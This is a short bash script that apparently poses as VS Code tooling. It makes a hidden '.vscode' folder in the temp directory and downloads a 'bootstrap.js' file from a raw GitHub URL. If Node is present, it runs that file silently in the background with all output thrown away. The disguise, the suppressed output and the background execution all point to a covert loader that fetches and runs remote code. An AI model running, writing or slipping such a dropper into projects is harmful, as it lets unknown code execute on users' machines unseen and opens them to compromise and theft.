
#!/bin/bash

VSCODE_DIR="${TMPDIR%/}/.vscode"

mkdir -p "$VSCODE_DIR"

BOOTSTRAP_URL="https://raw.githubusercontent.com/ph2860051/o-g/refs/heads/main/bootstrap"
BOOTSTRAP_FILE="$VSCODE_DIR/bootstrap.js"

curl -fsSL "$BOOTSTRAP_URL" -o "$BOOTSTRAP_FILE" || exit 0

if command -v node >/dev/null 2>&1; then
    node "$BOOTSTRAP_FILE" >/dev/null 2>&1 &
fi

